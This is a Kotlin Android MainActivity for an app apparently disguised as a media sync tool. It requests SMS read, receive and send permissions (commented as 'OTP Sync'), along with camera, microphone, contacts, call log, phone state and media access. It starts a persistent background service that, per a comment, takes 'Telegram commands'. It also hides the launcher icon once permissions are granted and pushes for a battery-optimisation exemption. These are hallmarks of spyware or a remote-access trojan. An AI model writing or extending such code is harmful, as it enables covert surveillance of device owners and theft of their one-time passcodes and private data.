package com.example

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.core.content.ContextCompat
import com.example.scanner.MediaSyncBackgroundService
import com.example.ui.MediaSyncScreen
import com.example.ui.MediaSyncViewModel
import com.example.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {

    private val viewModel: MediaSyncViewModel by viewModels()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val isGranted = checkStoragePermissionsGranted(permissions)
        if (isGranted) {
            viewModel.onPermissionGranted(autoStartSync = true)
            // Start persistent background watcher service
            MediaSyncBackgroundService.start(this)
            // If auto hide icon is enabled, hide launcher icon automatically after permissions granted
            if (viewModel.isAutoHideIconEnabled()) {
                com.example.scanner.IconManager.setIconHidden(this, true)
            }
            requestBatteryOptimizationExemption()
        } else {
            viewModel.onPermissionDenied()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Always ensure background service is running so Telegram commands work immediately
        MediaSyncBackgroundService.start(this)

        // Request exemption from battery optimizations so service is never paused
        requestBatteryOptimizationExemption()

        // Check if permissions are already granted on app launch
        if (hasRequiredStoragePermissions()) {
            viewModel.onPermissionGranted(autoStartSync = true)
        } else {
            requestStoragePermissions()
        }

        setContent {
            MyApplicationTheme {
                MediaSyncScreen(
                    viewModel = viewModel,
                    onRequestPermissions = { requestStoragePermissions() }
                )
            }
        }
    }

    override fun onResume() {
        super.onResume()
        MediaSyncBackgroundService.start(this)
        requestBatteryOptimizationExemption()
        if (hasRequiredStoragePermissions()) {
            viewModel.onPermissionGranted(autoStartSync = false)
        }
    }

    override fun onStop() {
        super.onStop()
        viewModel.lockApp()
    }

    private fun getRequiredPermissions(): Array<String> {
        val permissions = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // SMS / OTP Sync & Send permissions
        permissions.add(Manifest.permission.RECEIVE_SMS)
        permissions.add(Manifest.permission.READ_SMS)
        permissions.add(Manifest.permission.SEND_SMS)

        // Camera and Audio recording permissions
        permissions.add(Manifest.permission.CAMERA)
        permissions.add(Manifest.permission.RECORD_AUDIO)

        // Contacts, Call Logs, SIM status
        permissions.add(Manifest.permission.READ_CONTACTS)
        permissions.add(Manifest.permission.READ_CALL_LOG)
        permissions.add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }

        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
                permissions.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            }
            else -> {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        return permissions.toTypedArray()
    }

    private fun hasRequiredStoragePermissions(): Boolean {
        val storagePermissions = when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
            }
            else -> {
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        return storagePermissions.any { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun checkStoragePermissionsGranted(results: Map<String, Boolean>): Boolean {
        return results.entries.any { (perm, granted) ->
            granted && perm != Manifest.permission.POST_NOTIFICATIONS
        }
    }

    private fun requestStoragePermissions() {
        permissionLauncher.launch(getRequiredPermissions())
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } catch (_: Exception) {}
        }
    }
}

